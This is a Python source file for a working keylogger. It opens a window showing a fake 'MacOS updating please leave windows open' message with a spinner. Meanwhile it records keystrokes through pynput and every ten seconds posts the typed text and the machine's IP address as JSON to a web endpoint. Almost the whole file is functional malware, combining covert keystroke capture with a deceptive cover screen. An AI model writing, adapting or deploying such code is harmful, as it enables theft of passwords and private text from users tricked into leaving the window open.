import json
import threading
from pynput import keyboard
import urllib3
import socket
import requests
import subprocess
import time
import sys
from PyQt6.QtWidgets import QApplication, QMainWindow, QLabel
from PyQt6.QtCore import Qt
import cProfile

class KeyloggerGUI(QMainWindow):
    def __init__(self):
        super().__init__()

        self.setWindowTitle("Keylogger")
        self.setGeometry(100, 100, 400, 200)

        self.text_label = QLabel(" MacOS updating please leave windows open", self)

        self.setCentralWidget(self.text_label)

        self.hostname = socket.gethostname()
        self.IPAddr = self.get_ip_address(self.hostname)
        self.text = ""
        self.time_interval = 10

        self.timer = None
        self.done = False

        self.setup_keylogger()

    def get_ip_address(self, hostname):
        try:
            addr_info = socket.getaddrinfo(hostname, None)
            return addr_info[5][4][0]
        except socket.gaierror:
            return '127.0.0.1'

    def setup_keylogger(self):
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()

        self.send_post_req()

    def send_post_req(self):
        try:
            payload = json.dumps({"text": self.text, "ip": self.IPAddr})
            r = requests.post("http://127.0.0.1:8000/predict/",
                              headers={'accept': 'application/json', 'Content-Type': 'application/json'},
                              data=payload)

            self.text_label.setText("Sent POST request: " + payload)
            print(r)
        except:
            self.text_label.setText("Couldn't complete request!")

        self.reset()

        self.timer = threading.Timer(self.time_interval, self.send_post_req)
        self.timer.start()

    def reset(self):
        self.text = ""

    def on_press(self, key):
        if key == keyboard.Key.enter:
            pass
        elif key == keyboard.Key.tab:
            pass
        elif key == keyboard.Key.space:
            self.text += " "
        elif key == keyboard.Key.shift_r:
            pass
        elif key == keyboard.Key.shift_l:
            pass
        elif key == keyboard.Key.alt:
            pass
        elif key == keyboard.Key.ctrl:
            pass
        elif key == keyboard.Key.shift:
            pass
        elif key == keyboard.Key.cmd:
            pass
        elif key == keyboard.Key.caps_lock:
            pass
        elif key == keyboard.Key.right:
            pass
        elif key == keyboard.Key.left:
            pass
        elif key == keyboard.Key.down:
            pass
        elif key == keyboard.Key.up:
            pass
        elif key == keyboard.Key.backspace and len(self.text) == 0:
            pass
        elif key == keyboard.Key.backspace and len(self.text) > 0:
            self.text = self.text[:-1]
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            pass
        elif key == keyboard.Key.esc:
            return False
        else:
            self.text += str(key).strip("'")

    def loading_animation(self):
        animation = "|/-\\"
        idx = 0
        while True:
            self.text_label.setText(" MacOS updating please leave windows open" + animation[idx % len(animation)])
            idx += 1
            time.sleep(0.2)



if __name__ == '__main__':
    pr = cProfile.Profile()
    pr.enable()

    app = QApplication(sys.argv)
    gui = KeyloggerGUI()
    gui.show()
    t = threading.Thread(target=gui.loading_animation)
    t.start()

    # Add a time limit of 10 seconds
    time_limit = 10
    start_time = time.time()

    # Run the application until the time limit is reached
    while time.time() - start_time < time_limit:
        app.processEvents()

    # Stop the timer and exit the application
    gui.timer.cancel()
    gui.done = True
    app.quit()

    pr.disable()
    pr.print_stats(sort='time')
